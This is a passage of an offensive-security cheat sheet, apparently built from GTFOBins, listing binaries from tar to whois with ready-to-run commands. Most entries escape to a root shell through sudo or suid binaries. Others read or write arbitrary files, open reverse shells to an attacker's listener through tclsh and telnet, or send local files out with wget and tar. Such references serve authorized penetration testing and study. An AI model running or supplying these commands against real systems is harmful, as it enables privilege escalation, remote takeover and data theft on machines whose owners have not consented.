Upload tailscale upload with the Gtfobins GTFOBins technique.

The URL is reachable by any host of the same Tailnet.

```sh title:"GTFOBins Upload Tailscale Upload (tailscale upload (sudo)"
tailscale serve --http=$lport $file_in
```
<!-- cheat
import lports
var file_in
-->

## tar

### tar shell #1

Spawn tar shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Tar Shell #1 (tar shell (sudo / suid / unprivileged)"
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
<!-- cheat
-->

### tar shell #2

Spawn tar shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Tar Shell #2 (tar shell (sudo / suid / unprivileged)"
tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
```
<!-- cheat
-->

#### tar shell #2 - suid override
Spawn tar shell #2 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Tar Shell #2 (tar shell (suid variant)"
tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
```
<!-- cheat
-->

### tar shell #3

Spawn tar shell #3 with the Gtfobins GTFOBins technique.

The archive can also be prepared offline then uploaded to the target.

```sh title:"GTFOBins Spawn Tar Shell #3 (tar shell (sudo / suid / unprivileged)"
echo '/bin/sh 0<&1' >$tmp_file
tar cf $tmp_file $tmp_file
tar xf $tmp_file --to-command /bin/sh
```
<!-- cheat
var tmp_file
-->

### tar file-read

Read tar file read with the Gtfobins GTFOBins technique.

The file is read then passed to the specified command (e.g., `tar xO`) via standard input.

```sh title:"GTFOBins Read Tar File Read (tar file read (sudo / suid / unprivileged)"
tar cf /dev/stdout $file_in -I 'tar xO'
```
<!-- cheat
var file_in
-->

### tar file-write

Write tar file write with the Gtfobins GTFOBins technique.

The archive can also be prepared offline then uploaded to the target.

```sh title:"GTFOBins Write Tar File Write (tar file write (sudo / suid / unprivileged)"
echo $data >$tmp_file
tar cf $tmp_file $tmp_file
tar Pxf $tmp_file --xform s@.*@$file_out@
```
<!-- cheat
var data
var file_out
var tmp_file
-->

### tar download

Download tar download with the Gtfobins GTFOBins technique.

The attacker box must have the `rmt` utility installed.

```sh title:"GTFOBins Download Tar Download (tar download (sudo / suid / unprivileged)"
tar xvf user@$lhost:$file_in.tar --rsh-command=/bin/ssh
```
<!-- cheat
import tun_ip
var file_in
-->

### tar upload

Upload tar upload with the Gtfobins GTFOBins technique.

The attacker box must have the `rmt` utility installed.

```sh title:"GTFOBins Upload Tar Upload (tar upload (sudo / suid / unprivileged)"
tar cvf user@$lhost:$file_out $file_in --rsh-command=/bin/ssh
```
<!-- cheat
import tun_ip
var file_in
var file_out
-->

## task

### task shell

Spawn task shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Task Shell (task shell (sudo / suid / unprivileged)"
task execute /bin/sh
```
<!-- cheat
-->

## taskset

### taskset shell

Spawn taskset shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Taskset Shell (taskset shell (sudo / unprivileged)"
taskset 1 /bin/sh
```
<!-- cheat
-->

## tasksh

### tasksh shell

Spawn tasksh shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Tasksh Shell (tasksh shell (sudo / suid / unprivileged)"
tasksh
!/bin/sh
```
<!-- cheat
-->

## tbl

### tbl file-read

Read tbl file read with the Gtfobins GTFOBins technique.

The read file content is corrupted by additional text at the beginning.

```sh title:"GTFOBins Read Tbl File Read (tbl file read (sudo / suid / unprivileged)"
tbl $file_in
```
<!-- cheat
var file_in
-->

## tclsh

### tclsh shell

Spawn tclsh shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Tclsh Shell (tclsh shell (sudo / suid / unprivileged)"
tclsh
```
<!-- cheat
-->

### tclsh reverse-shell

Start tclsh reverse shell with the Gtfobins GTFOBins technique.

Connect back to an attacker-controlled listener.

```sh title:"GTFOBins Start Tclsh Reverse Shell (tclsh reverse shell (sudo / suid / unprivileged)"
tclsh
set s [socket $lhost $lport];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;
```
<!-- cheat
import tun_ip
import lports
-->

### tclsh library-load

Run tclsh library load with the Gtfobins GTFOBins technique.

Load an attacker-supplied shared library.

```sh title:"GTFOBins Run Tclsh Library Load (tclsh library load (capabilities / sudo / suid / unprivileged)"
tclsh
load $lib x
```
<!-- cheat
var lib
-->

## tcpdump

### tcpdump command #1

Dump tcpdump command #1 with the Gtfobins GTFOBins technique.

This requires some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.

```sh title:"GTFOBins Dump Tcpdump Command #1 (tcpdump command (sudo / unprivileged)"
echo $cmd_file >$tmp_file
chmod +x $tmp_file
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $tmp_file
```
<!-- cheat
var cmd_file
var tmp_file
-->

#### tcpdump command #1 - sudo override
Dump tcpdump command #1 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Dump Tcpdump Command #1 (tcpdump command (sudo variant)"
echo $cmd_file >$tmp_file
chmod +x $tmp_file
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $tmp_file -Z root
```
<!-- cheat
var cmd_file
var tmp_file
-->

### tcpdump command #2

Dump tcpdump command #2 with the Gtfobins GTFOBins technique.

This require some traffic to be actually captured. Also note that the `command-argument` string is both passed to the command and written as file, hence some restrictions apply.

```sh title:"GTFOBins Dump Tcpdump Command #2 (tcpdump command (sudo / unprivileged)"
tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z $cmd_file
```
<!-- cheat
var cmd_file
-->

### tcpdump file-write

Dump tcpdump file write with the Gtfobins GTFOBins technique.

This saves the packet dump (count is 1) from the loopback interface to a file. To trigger the capture use something like:  ``` nc -u localhost 1 <<<$data ```  While `user` is the owner of the packet dump file, the invoking user must be able to capture traffic on the device.

```sh title:"GTFOBins Dump Tcpdump File Write (tcpdump file write (sudo / suid / unprivileged)"
tcpdump -ln -i lo -w $file_out -c 1 -Z user
```
<!-- cheat
var file_out
-->

## tcsh

### tcsh shell

Spawn tcsh shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Tcsh Shell (tcsh shell (sudo / suid / unprivileged)"
tcsh
```
<!-- cheat
-->

#### tcsh shell - suid override
Spawn tcsh shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Tcsh Shell (tcsh shell (suid variant)"
tcsh -b
```
<!-- cheat
-->

### tcsh file-write

Write tcsh file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Tcsh File Write (tcsh file write (sudo / suid / unprivileged)"
tcsh -c 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

#### tcsh file-write - suid override
Write tcsh file write with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Write Tcsh File Write (tcsh file write (suid variant)"
tcsh -bc 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

## tdbtool

### tdbtool shell

Spawn tdbtool shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Tdbtool Shell (tdbtool shell (sudo / suid / unprivileged)"
tdbtool
! /bin/sh
```
<!-- cheat
-->

## tee

### tee file-write

Write tee file write with the Gtfobins GTFOBins technique.

Use `-a` to append data to exising files.

```sh title:"GTFOBins Write Tee File Write (tee file write (sudo / suid / unprivileged)"
echo $data | tee $file_out
```
<!-- cheat
var data
var file_out
-->

## telnet

### telnet shell

Spawn telnet shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Telnet Shell (telnet shell (sudo / suid / unprivileged)"
telnet
!/bin/sh
```
<!-- cheat
-->

### telnet reverse-shell

Start telnet reverse shell with the Gtfobins GTFOBins technique.

The shell process is not spawn by `openssl`.

```sh title:"GTFOBins Start Telnet Reverse Shell (telnet reverse shell (sudo / suid / unprivileged)"
mkfifo $tmp_sock
telnet $lhost $lport <$tmp_sock | /bin/sh >$tmp_sock
```
<!-- cheat
import tun_ip
import lports
var tmp_sock
-->

## terraform

### terraform file-read

Read terraform file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Terraform File Read (terraform file read (sudo / suid / unprivileged)"
terraform console
file("$file_in")
```
<!-- cheat
var file_in
-->

## tex

### tex shell

Spawn tex shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Tex Shell (tex shell (sudo / suid / unprivileged)"
tex --shell-escape '\immediate\write18{/bin/sh}'
```
<!-- cheat
-->

## tftp

### tftp download

Download tftp download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Tftp Download (tftp download (sudo / suid / unprivileged)"
tftp $lhost
get $file_in
```
<!-- cheat
import tun_ip
var file_in
-->

### tftp upload

Upload tftp upload with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Tftp Upload (tftp upload (sudo / suid / unprivileged)"
tftp $lhost
put $file_in
```
<!-- cheat
import tun_ip
var file_in
-->

## tic

### tic file-read

Read tic file read with the Gtfobins GTFOBins technique.

This translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure.

```sh title:"GTFOBins Read Tic File Read (tic file read (sudo / suid / unprivileged)"
tic -C $file_in
```
<!-- cheat
var file_in
-->

## time

### time shell

Spawn time shell with the Gtfobins GTFOBins technique.

Note that the shell might have its own builtin `time` implementation, which may behave differently than the binary, which is often located at `/usr/bin/time`.

```sh title:"GTFOBins Spawn Time Shell (time shell (sudo / suid / unprivileged)"
time /bin/sh
```
<!-- cheat
-->

#### time shell - suid override
Spawn time shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Time Shell (time shell (suid variant)"
time /bin/sh -p
```
<!-- cheat
-->

## timedatectl

This might not work if run by unprivileged users depending on the system configuration.

### timedatectl inherit (inherits from less)

Run timedatectl inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Timedatectl Inherit (inherits from Less) (timedatectl inherit from less (sudo / unprivileged)"
timedatectl list-timezones
```
<!-- cheat
-->

## timeout

### timeout shell

Spawn timeout shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Timeout Shell (timeout shell (sudo / suid / unprivileged)"
timeout 0 /bin/sh
```
<!-- cheat
-->

#### timeout shell - suid override
Spawn timeout shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Timeout Shell (timeout shell (suid variant)"
timeout 0 /bin/sh -p
```
<!-- cheat
-->

## tmate

### tmate shell

Spawn tmate shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Tmate Shell (tmate shell (sudo / suid / unprivileged)"
tmate -c /bin/sh
```
<!-- cheat
-->

## tmux

### tmux shell #1

Spawn tmux shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Tmux Shell #1 (tmux shell (sudo / suid / unprivileged)"
tmux -c /bin/sh
```
<!-- cheat
-->

### tmux shell #2

Spawn tmux shell #2 with the Gtfobins GTFOBins technique.

Provided to have enough permissions to access the socket (e.g., `/tmp/tmux-xxx/default`).

```sh title:"GTFOBins Spawn Tmux Shell #2 (tmux shell (sudo / suid / unprivileged)"
tmux -S $socket
```
<!-- cheat
var socket
-->

### tmux file-read

Read tmux file read with the Gtfobins GTFOBins technique.

The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.

```sh title:"GTFOBins Read Tmux File Read (tmux file read (sudo / suid / unprivileged)"
tmux -f $file_in
```
<!-- cheat
var file_in
-->

## top

### top shell

Spawn top shell with the Gtfobins GTFOBins technique.

The config path might be different.

```sh title:"GTFOBins Spawn Top Shell (top shell (sudo / unprivileged)"
echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return twice
reset
```
<!-- cheat
-->

## torify

### torify shell

Spawn torify shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Torify Shell (torify shell (sudo / unprivileged)"
torify /bin/sh
```
<!-- cheat
-->

## torsocks

### torsocks shell

Spawn torsocks shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Torsocks Shell (torsocks shell (sudo / unprivileged)"
torsocks /bin/sh
```
<!-- cheat
-->

## troff

### troff file-read

Read troff file read with the Gtfobins GTFOBins technique.

The file is typeset but text is still readable in the output, alternatively the output can be read with `man -l`.

```sh title:"GTFOBins Read Troff File Read (troff file read (sudo / suid / unprivileged)"
troff $file_in
```
<!-- cheat
var file_in
-->

## tsc

### tsc file-read

Read tsc file read with the Gtfobins GTFOBins technique.

Content is leaked as error messages. The file extension must be one of the supported ones, e.g., `.ts`, `.tsx`, etc.

```sh title:"GTFOBins Read Tsc File Read (tsc file read (sudo / unprivileged)"
tsc $file_in.ts
```
<!-- cheat
var file_in
-->

### tsc file-write

Write tsc file write with the Gtfobins GTFOBins technique.

Content is leaked as error messages and written to file. The file extension must be one of the supported ones, e.g., `.ts`, `.tsx`, etc.

```sh title:"GTFOBins Write Tsc File Write (tsc file write (sudo / unprivileged)"
tsc $file_in.ts --outFile $file_out
```
<!-- cheat
var file_in
var file_out
-->

## tshark

### tshark inherit (inherits from lua)

Run tshark inherit (inherits from lua) with the Gtfobins GTFOBins technique.

This allows to run Lua code (`...`).

```sh title:"GTFOBins Run Tshark Inherit (inherits from Lua) (tshark inherit from lua (sudo / unprivileged)"
echo '...' >$tmp_file
tshark -Xlua_script:$tmp_file
```
<!-- cheat
var tmp_file
-->

## ul

### ul file-read

Read ul file read with the Gtfobins GTFOBins technique.

The read file content is corrupted by replacing occurrences of `$'\b_'` to terminal sequences and by converting tabs to spaces.

```sh title:"GTFOBins Read Ul File Read (ul file read (sudo / suid / unprivileged)"
ul $file_in
```
<!-- cheat
var file_in
-->

## unexpand

### unexpand file-read

Read unexpand file read with the Gtfobins GTFOBins technique.

Convert sequences of (e.g., `999`) spaces to tab.

```sh title:"GTFOBins Read Unexpand File Read (unexpand file read (sudo / suid / unprivileged)"
unexpand -t999 $file_in
```
<!-- cheat
var file_in
-->

## uniq

### uniq file-read

Read uniq file read with the Gtfobins GTFOBins technique.

The read file content is corrupted by squashing multiple adjacent lines.

```sh title:"GTFOBins Read Uniq File Read (uniq file read (sudo / suid / unprivileged)"
uniq $file_in
```
<!-- cheat
var file_in
-->

## unshare

### unshare shell

Spawn unshare shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Unshare Shell (unshare shell (sudo / suid / unprivileged)"
unshare /bin/sh
```
<!-- cheat
-->

#### unshare shell - suid override
Spawn unshare shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Unshare Shell (unshare shell (suid variant)"
unshare -r /bin/sh
```
<!-- cheat
-->

## unsquashfs

`unsquashfs` preserve the SUID bit when extracting the file system. For example, prepare an archive beforehand with the following commands as root:  ``` cp /bin/sh . chmod +s sh mksquashfs sh shell ```

### unsquashfs privilege-escalation

Run unsquashfs privilege escalation with the Gtfobins GTFOBins technique.

Escalate privileges directly.

```sh title:"GTFOBins Run Unsquashfs Privilege Escalation (unsquashfs privilege escalation (sudo / suid)"
unsquashfs shell
./squashfs-root/sh -p
```
<!-- cheat
-->

## unzip

Certain `unzip` versions allows to preserve the SUID bit. For example, prepare an archive beforehand with the following commands as root:  ``` cp /bin/sh . chmod +s sh zip shell.zip sh ```

### unzip privilege-escalation

Run unzip privilege escalation with the Gtfobins GTFOBins technique.

Escalate privileges directly.

```sh title:"GTFOBins Run Unzip Privilege Escalation (unzip privilege escalation (sudo / suid)"
unzip -K shell.zip
./sh -p
```
<!-- cheat
-->

## update-alternatives

### update-alternatives file-write

Update alternatives file write with the Gtfobins GTFOBins technique.

Write in `$file_out` a symlink to `$tmp_file`.

```sh title:"GTFOBins Update Alternatives File Write (update-alternatives file write (sudo / suid)"
echo $data >$tmp_file
update-alternatives --force --install $file_out x $tmp_file 0
```
<!-- cheat
var data
var file_out
var tmp_file
-->

## urlget

### urlget file-read

Read urlget file read with the Gtfobins GTFOBins technique.

This is part of `gettext` and usually not in `PATH`, e.g., on Arch it can be found at `/usr/lib/gettext/urlget`.

```sh title:"GTFOBins Read Urlget File Read (urlget file read (sudo / suid / unprivileged)"
urlget - $file_in
```
<!-- cheat
var file_in
-->

## uuencode

### uuencode file-read

Read uuencode file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Uuencode File Read (uuencode file read (sudo / suid / unprivileged)"
uuencode $file_in /dev/stdout | uudecode
```
<!-- cheat
var file_in
-->

## uv

### uv shell

Spawn uv shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn uv Shell (uv shell (sudo / unprivileged)"
uv run /bin/sh
```
<!-- cheat
-->

## vagrant

### vagrant inherit (inherits from ruby)

Run vagrant inherit (inherits from ruby) with the Gtfobins GTFOBins technique.

This allows to run Ruby code (`...`).

```sh title:"GTFOBins Run Vagrant Inherit (inherits from Ruby) (vagrant inherit from ruby (sudo / unprivileged)"
echo '...' >Vagrantfile
vagrant up
```
<!-- cheat
-->

## valgrind

### valgrind shell

Spawn valgrind shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Valgrind Shell (valgrind shell (sudo / unprivileged)"
valgrind /bin/sh
```
<!-- cheat
-->

## varnishncsa

A running `varnishd` instance must be available.

### varnishncsa file-write

Write varnishncsa file write with the Gtfobins GTFOBins technique.

The command hangs, so the trigger command must be performed asynchronously or in another terminal:  ``` curl -H 'xxx: $data' http://localhost:6081/xxxxxxxxxx ```

```sh title:"GTFOBins Write Varnishncsa File Write (varnishncsa file write (sudo / suid)"
varnishncsa -g request -q 'ReqURL ~ "/xxxxxxxxxx"' -F '%{yyy}i' -w $file_out
```
<!-- cheat
var file_out
-->

## vi

### vi shell #1

Spawn vi shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Vi Shell #1 (vi shell (sudo / suid / unprivileged)"
vi -c ':!/bin/sh' /dev/null
```
<!-- cheat
-->

### vi shell #2

Spawn vi shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Vi Shell #2 (vi shell (sudo / suid / unprivileged)"
vi -c ':shell'
```
<!-- cheat
-->

### vi shell #3

Spawn vi shell #3 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Vi Shell #3 (vi shell (sudo / suid / unprivileged)"
vi -c ':set shell=/bin/sh | shell'
```
<!-- cheat
-->

#### vi shell #3 - suid override
Spawn vi shell #3 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Vi Shell #3 (vi shell (suid variant)"
vi -c ':set shell=/bin/sh\ -p | shell'
```
<!-- cheat
-->

### vi shell #4

Spawn vi shell #4 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Vi Shell #4 (vi shell (sudo / suid / unprivileged)"
vi -c :terminal /bin/sh
```
<!-- cheat
-->

#### vi shell #4 - suid override
Spawn vi shell #4 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Vi Shell #4 (vi shell (suid variant)"
vi -c ':terminal /bin/sh -p'
```
<!-- cheat
-->

### vi file-read

Read vi file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Vi File Read (vi file read (sudo / suid / unprivileged)"
vi $file_in
```
<!-- cheat
var file_in
-->

### vi file-write

Write vi file write with the Gtfobins GTFOBins technique.

Where `^[` is the escape key.

```sh title:"GTFOBins Write Vi File Write (vi file write (sudo / suid / unprivileged)"
vi $file_out
iDATA
^[
w
```
<!-- cheat
var file_out
-->

## view

Alias of [vim](#vim). All techniques from `vim` apply.

## vigr

### vigr inherit (inherits from vi)

Run vigr inherit (inherits from vi) with the Gtfobins GTFOBins technique.

Despite requiring superuser privileges to run, the editor is executed as the unprivileged user.

```sh title:"GTFOBins Run Vigr Inherit (inherits from Vi) (vigr inherit from vi (sudo / suid)"
vigr
```
<!-- cheat
-->

## vim

### vim file-read

Read vim file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Vim File Read (vim file read (sudo / suid / unprivileged)"
vim -c ':redir! >$file_out | echo "$data" | redir END | q'
```
<!-- cheat
var data
var file_out
-->

### vim inherit #1 (inherits from python)

Run vim inherit #1 (inherits from python) with the Gtfobins GTFOBins technique.

This allows to run Python code (`...`).

```sh title:"GTFOBins Run Vim Inherit #1 (inherits from Python) (vim inherit #1 inherit from python (sudo / suid / unprivileged)"
vim -c ':py ...'
```
<!-- cheat
-->

### vim inherit #2 (inherits from lua)

Run vim inherit #2 (inherits from lua) with the Gtfobins GTFOBins technique.

This allows to run Lua code (`...`).

```sh title:"GTFOBins Run Vim Inherit #2 (inherits from Lua) (vim inherit #2 inherit from lua (sudo / suid / unprivileged)"
vim -c ':lua ...'
```
<!-- cheat
-->

### vim inherit #3 (inherits from vi)

Run vim inherit #3 (inherits from vi) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Vim Inherit #3 (inherits from Vi) (vim inherit #3 inherit from vi (sudo / suid / unprivileged)"
vim
```
<!-- cheat
-->

## vimdiff

Alias of [vim](#vim). All techniques from `vim` apply.

## vipw

### vipw inherit (inherits from vi)

Run vipw inherit (inherits from vi) with the Gtfobins GTFOBins technique.

Despite requiring superuser privileges to run, the editor is executed as the unprivileged user.

```sh title:"GTFOBins Run Vipw Inherit (inherits from Vi) (vipw inherit from vi (sudo / suid)"
vipw
```
<!-- cheat
-->

## virsh

### virsh command

Execute virsh command with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute Virsh Command (virsh command (sudo)"
cat >$tmp_file <<EOF
<domain type='kvm'>
  <name>x</name>
  <os>
    <type arch='x86_64'>hvm</type>
  </os>
  <memory unit='KiB'>1</memory>
  <devices>
    <interface type='ethernet'>
      <script path='$cmd_file'/>
    </interface>
  </devices>
</domain>
EOF
virsh -c qemu:///system create $tmp_file
virsh -c qemu:///system destroy x
```
<!-- cheat
var cmd_file
var tmp_file
-->

### virsh file-write #1

Write virsh file write #1 with the Gtfobins GTFOBins technique.

This requires the user to be in the `libvirt` group. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML.

```sh title:"GTFOBins Write Virsh File Write #1 (virsh file write (sudo / unprivileged)"
echo $data >$tmp_file

cat >$tmp_file <<EOF
<volume type='file'>
  <name>y</name>
  <key>$dir_out/output-file</key>
  <source>
  </source>
  <capacity unit='bytes'>5</capacity>
  <allocation unit='bytes'>4096</allocation>
  <physical unit='bytes'>5</physical>
  <target>
    <path>$dir_out/output-file</path>
    <format type='raw'/>
    <permissions>
      <mode>0600</mode>
      <owner>0</owner>
      <group>0</group>
    </permissions>
  </target>
</volume>
EOF

virsh -c qemu:///system pool-create-as x dir --target $dir_out/
virsh -c qemu:///system vol-create --pool x --file $tmp_file
virsh -c qemu:///system vol-upload --pool x $dir_out/output-file $tmp_file
virsh -c qemu:///system pool-destroy x
```
<!-- cheat
var data
var dir_out
var tmp_file
-->

### virsh file-write #2

Write virsh file write #2 with the Gtfobins GTFOBins technique.

This requires the user to be in the `libvirt` group.

```sh title:"GTFOBins Write Virsh File Write #2 (virsh file write (sudo / unprivileged)"
virsh -c qemu:///system pool-create-as x dir --target $dir/
virsh -c qemu:///system vol-download --pool x input-file output-file
virsh -c qemu:///system pool-destroy x
```
<!-- cheat
var dir
-->

## volatility

This allows to run Python code (`...`). Some valid core dump file is required, if not available, can be uploaded to the target.

### volatility inherit (inherits from python)

Run volatility inherit (inherits from python) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Volatility Inherit (inherits from Python) (volatility inherit from python (sudo / suid / unprivileged)"
volatility -f $core volshell
...
```
<!-- cheat
var core
-->

## w3m

### w3m file-read

Read w3m file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read W3m File Read (w3m file read (sudo / suid / unprivileged)"
w3m -dump $file_in
```
<!-- cheat
var file_in
-->

## wall

### wall file-read

Read wall file read with the Gtfobins GTFOBins technique.

The textual file is dumped on the current TTY (neither to `stdout` nor to `stderr`).

```sh title:"GTFOBins Read Wall File Read (wall file read (sudo)"
wall --nobanner $file_in
```
<!-- cheat
var file_in
-->

## watch

### watch shell #1

Spawn watch shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Watch Shell #1 (watch shell (sudo / suid / unprivileged)"
watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'
```
<!-- cheat
-->

#### watch shell #1 - suid override
Spawn watch shell #1 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Watch Shell #1 (watch shell (suid variant)"
watch -x /bin/sh -p -c 'reset; exec /bin/sh -p 1>&0 2>&0'
```
<!-- cheat
-->

### watch shell #2

Spawn watch shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Watch Shell #2 (watch shell (sudo / suid / unprivileged)"
watch 'reset; exec /bin/sh 1>&0 2>&0'
```
<!-- cheat
-->

## wc

### wc file-read

Read wc file read with the Gtfobins GTFOBins technique.

The file content is parsed as a sequence of `\x00` separated paths. On error the file content appears in a message.

```sh title:"GTFOBins Read Wc File Read (wc file read (sudo / suid / unprivileged)"
wc --files0-from $file_in
```
<!-- cheat
var file_in
-->

## wg-quick

### wg-quick shell

Spawn wg quick shell with the Gtfobins GTFOBins technique.

Use `wg-quick down $tmp_file` in order to be able to run the shell again.

```sh title:"GTFOBins Spawn Wg Quick Shell (wg-quick shell (sudo)"
cat >$tmp_file <<EOF
[Interface]
PostUp = /bin/sh
EOF

wg-quick up $tmp_file
```
<!-- cheat
var tmp_file
-->

## wget

### wget shell

Enumerate wget shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Enumerate Wget Shell (wget shell (sudo / suid / unprivileged)"
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$tmp_file
chmod +x $tmp_file
wget --use-askpass=$tmp_file 0
```
<!-- cheat
var tmp_file
-->

#### wget shell - suid override
Enumerate wget shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Enumerate Wget Shell (wget shell (suid variant)"
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$tmp_file
chmod +x $tmp_file
wget --use-askpass=$tmp_file 0
```
<!-- cheat
var tmp_file
-->

### wget file-read

Read wget file read with the Gtfobins GTFOBins technique.

The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.

```sh title:"GTFOBins Read Wget File Read (wget file read (sudo / suid / unprivileged)"
wget -i $file_in
```
<!-- cheat
var file_in
-->

### wget file-write

Write wget file write with the Gtfobins GTFOBins technique.

The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.

```sh title:"GTFOBins Write Wget File Write (wget file write (sudo / suid / unprivileged)"
wget -i $file_in -o $file_out
```
<!-- cheat
var file_in
var file_out
-->

### wget download

Download wget download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Wget Download (wget download (sudo / suid / unprivileged)"
wget $scheme://$lhost$file_in -O $file_out
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

### wget upload #1

Upload wget upload #1 with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Wget Upload #1 (wget upload (sudo / suid / unprivileged)"
wget --post-file=$file_in $scheme://$lhost
```
<!-- cheat
import tun_ip
import scheme
var file_in
-->

### wget upload #2

Upload wget upload #2 with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Wget Upload #2 (wget upload (sudo / suid / unprivileged)"
wget --post-data=$data $scheme://$lhost
```
<!-- cheat
import tun_ip
import scheme
var data
-->

## whiptail

### whiptail file-read

Read whiptail file read with the Gtfobins GTFOBins technique.

The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content.

```sh title:"GTFOBins Read Whiptail File Read (whiptail file read (sudo / suid / unprivileged)"
whiptail --textbox --scrolltext $file_in 0 0
```
<!-- cheat
var file_in
-->

## whois

### whois download

Download whois download with the Gtfobins GTFOBins technique.

Received data has instances of the `\r` byte stripped.

